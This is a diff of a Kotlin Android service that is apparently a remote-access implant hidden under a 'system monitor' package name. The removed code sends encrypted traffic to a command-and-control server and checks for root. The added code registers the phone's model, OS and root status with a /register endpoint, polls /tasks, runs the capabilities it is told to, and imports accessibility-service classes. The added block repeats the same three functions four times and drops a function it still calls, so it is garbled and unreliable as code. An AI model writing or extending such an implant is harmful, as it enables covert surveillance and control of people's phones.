@@ -1,5 +1,11 @@
 package com.system.monitor
 
+import android.accessibilityservice.AccessibilityService
+import android.app.Notification
+import android.app.NotificationChannel
+import android.app.NotificationManager
+import android.app.PendingIntent
+import android.app.Service
 import android.content.BroadcastReceiver
 import android.content.ComponentName
 import android.content.Context
@@ -261,90 +267,183 @@ class AgentService : Service() {
             error = e.message
             status = "failed"
         }
-        sendResult(Result(task.id, agentId!!, output, error, status))
+        sendLocalResult(task.id, output, error, status)
     }
 
-    private fun sendResult(result: Result) {
-        post("/results", result)
-    }
-
-    private fun post(endpoint: String, payload: Any): Map<String, Any>? {
+    private fun registerAgent() {
         try {
-            val url = URL("${getC2Server()}$endpoint")
-            val conn = url.openConnection() as HttpURLConnection
-            conn.requestMethod = "POST"
-            conn.doOutput = true
-            conn.connectTimeout = 15000
-            conn.readTimeout = 15000
-            conn.setRequestProperty("Content-Type", "application/octet-stream")
-            conn.setRequestProperty("X-Agent-ID", agentId ?: "")
-
-            val encrypted = encrypt(gson.toJson(payload).toByteArray(StandardCharsets.UTF_8))
-            conn.outputStream.write(encrypted)
-            conn.outputStream.flush()
-
-            if (conn.responseCode == 200) {
-                val decrypted = decrypt(conn.inputStream.readAllBytes())
-                val type = object : com.google.gson.reflect.TypeToken<Map<String, Any>>() {}.type
-                return gson.fromJson(String(decrypted, StandardCharsets.UTF_8), type)
-            }
+            val payload = mapOf(
+                "agent_id" to generateAgentId(),
+                "hostname" to Build.MODEL,
+                "os" to "android",
+                "arch" to System.getProperty("os.arch"),
+                "android_version" to Build.VERSION.RELEASE,
+                "sdk" to Build.VERSION.SDK_INT.toString(),
+                "privileged" to isRooted().toString()
+            )
+            val resp = post("/register", payload)
+            resp?.let { agentId = it["agent_id"] as? String }
         } catch (e: Exception) {
-            Log.e("Agent", "Post error", e)
-        }
-        return null
-    }
-
-    private fun encrypt(data: ByteArray): ByteArray {
-        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
-        val nonce = ByteArray(12)
-        SecureRandom().nextBytes(nonce)
-        cipher.init(Cipher.ENCRYPT_MODE, aesKey!!, GCMParameterSpec(128, nonce))
-        val encrypted = cipher.doFinal(data)
-        val encryptedKey = encryptRSA(aesKey!!.encoded)
-        return encryptedKey + nonce + encrypted
-    }
-
-    private fun decrypt(data: ByteArray): ByteArray {
-        val keyLen = 256
-        val encryptedKey = data.copyOfRange(0, keyLen)
-        val nonce = data.copyOfRange(keyLen, keyLen + 12)
-        val ct = data.copyOfRange(keyLen + 12, data.size)
-        val aesKeyBytes = decryptRSA(encryptedKey)
-        val keySpec = SecretKeySpec(aesKeyBytes, "AES")
-        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
-        cipher.init(Cipher.DECRYPT_MODE, keySpec, GCMParameterSpec(128, nonce))
-        return cipher.doFinal(ct)
-    }
-
-    private fun encryptRSA(data: ByteArray): ByteArray {
-        val cipher = Cipher.getInstance("RSA/ECB/OAEPWithSHA-256AndMGF1Padding")
-        cipher.init(Cipher.ENCRYPT_MODE, rsaPublicKey!!)
-        return cipher.doFinal(data)
-    }
-
-    private fun decryptRSA(data: ByteArray): ByteArray {
-        val prefs = getSharedPreferences("agent_keys", MODE_PRIVATE)
-        val privKeyB64 = prefs.getString("private_key", "")!!
-        val keyFactory = KeyFactory.getInstance("RSA")
-        val privKey = keyFactory.generatePrivate(PKCS8EncodedKeySpec(Base64.decode(privKeyB64, Base64.NO_WRAP)))
-        val cipher = Cipher.getInstance("RSA/ECB/OAEPWithSHA-256AndMGF1Padding")
-        cipher.init(Cipher.DECRYPT_MODE, privKey)
-        return cipher.doFinal(data)
-    }
-
-    private fun generateAgentId(): String {
-        val prefs = getSharedPreferences("agent_keys", MODE_PRIVATE)
-        return prefs.getString("agent_id", "") ?: java.util.UUID.randomUUID().toString().also {
-            prefs.edit().putString("agent_id", it).apply()
+            Log.e("Agent", "Register error", e)
         }
     }
 
-    private fun isRooted(): Boolean {
-        return try {
-            Runtime.getRuntime().exec("su").waitFor() == 0
+    private fun fetchTasks(): List<Task> {
+        try {
+            val payload = mapOf("agent_id" to agentId!!)
+            val resp = post("/tasks", payload)
+            val tasksJson = resp?.get("tasks")
+            return tasksJson?.let { gson.fromJson(gson.toJson(it), Array<Task>::class.java).toList() } ?: emptyList()
         } catch (e: Exception) {
-            false
+            Log.e("Agent", "Fetch tasks error", e)
+            return emptyList()
         }
+    }
+
+    private fun executeTask(task: Task) {
+        val capability = capabilities[task.capability] ?: return
+        var output: Any? = null
+        var error: String? = null
+        var status = "completed"
+        try {
+            output = capability.execute(task.args)
+        } catch (e: Exception) {
+            error = e.message
+            status = "failed"
+        }
+        sendLocalResult(task.id, output, error, status)
+    }
+
+    private fun registerAgent() {
+        try {
+            val payload = mapOf(
+                "agent_id" to generateAgentId(),
+                "hostname" to Build.MODEL,
+                "os" to "android",
+                "arch" to System.getProperty("os.arch"),
+                "android_version" to Build.VERSION.RELEASE,
+                "sdk" to Build.VERSION.SDK_INT.toString(),
+                "privileged" to isRooted().toString()
+            )
+            val resp = post("/register", payload)
+            resp?.let { agentId = it["agent_id"] as? String }
+        } catch (e: Exception) {
+            Log.e("Agent", "Register error", e)
+        }
+    }
+
+    private fun fetchTasks(): List<Task> {
+        try {
+            val payload = mapOf("agent_id" to agentId!!)
+            val resp = post("/tasks", payload)
+            val tasksJson = resp?.get("tasks")
+            return tasksJson?.let { gson.fromJson(gson.toJson(it), Array<Task>::class.java).toList() } ?: emptyList()
+        } catch (e: Exception) {
+            Log.e("Agent", "Fetch tasks error", e)
+            return emptyList()
+        }
+    }
+
+    private fun executeTask(task: Task) {
+        val capability = capabilities[task.capability] ?: return
+        var output: Any? = null
+        var error: String? = null
+        var status = "completed"
+        try {
+            output = capability.execute(task.args)
+        } catch (e: Exception) {
+            error = e.message
+            status = "failed"
+        }
+        sendLocalResult(task.id, output, error, status)
+    }
+
+    private fun registerAgent() {
+        try {
+            val payload = mapOf(
+                "agent_id" to generateAgentId(),
+                "hostname" to Build.MODEL,
+                "os" to "android",
+                "arch" to System.getProperty("os.arch"),
+                "android_version" to Build.VERSION.RELEASE,
+                "sdk" to Build.VERSION.SDK_INT.toString(),
+                "privileged" to isRooted().toString()
+            )
+            val resp = post("/register", payload)
+            resp?.let { agentId = it["agent_id"] as? String }
+        } catch (e: Exception) {
+            Log.e("Agent", "Register error", e)
+        }
+    }
+
+    private fun fetchTasks(): List<Task> {
+        try {
+            val payload = mapOf("agent_id" to agentId!!)
+            val resp = post("/tasks", payload)
+            val tasksJson = resp?.get("tasks")
+            return tasksJson?.let { gson.fromJson(gson.toJson(it), Array<Task>::class.java).toList() } ?: emptyList()
+        } catch (e: Exception) {
+            Log.e("Agent", "Fetch tasks error", e)
+            return emptyList()
+        }
+    }
+
+    private fun executeTask(task: Task) {
+        val capability = capabilities[task.capability] ?: return
+        var output: Any? = null
+        var error: String? = null
+        var status = "completed"
+        try {
+            output = capability.execute(task.args)
+        } catch (e: Exception) {
+            error = e.message
+            status = "failed"
+        }
+        sendLocalResult(task.id, output, error, status)
+    }
+
+    private fun registerAgent() {
+        try {
+            val payload = mapOf(
+                "agent_id" to generateAgentId(),
+                "hostname" to Build.MODEL,
+                "os" to "android",
+                "arch" to System.getProperty("os.arch"),
+                "android_version" to Build.VERSION.RELEASE,
+                "sdk" to Build.VERSION.SDK_INT.toString(),
+                "privileged" to isRooted().toString()
+            )
+            val resp = post("/register", payload)
+            resp?.let { agentId = it["agent_id"] as? String }
+        } catch (e: Exception) {
+            Log.e("Agent", "Register error", e)
+        }
+    }
+
+    private fun fetchTasks(): List<Task> {
+        try {
+            val payload = mapOf("agent_id" to agentId!!)
+            val resp = post("/tasks", payload)
+            val tasksJson = resp?.get("tasks")
+            return tasksJson?.let { gson.fromJson(gson.toJson(it), Array<Task>::class.java).toList() } ?: emptyList()
+        } catch (e: Exception) {
+            Log.e("Agent", "Fetch tasks error", e)
+            return emptyList()
+        }
+    }
+
+    private fun executeTask(task: Task) {
+        val capability = capabilities[task.capability] ?: return
+        var output: Any? = null
+        var error: String? = null
+        var status = "completed"
+        try {
+            output = capability.execute(task.args)
+        } catch (e: Exception) {
+            error = e.message
+            status = "failed"
+        }
+        sendLocalResult(task.id, output, error, status)
     }
 
     @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
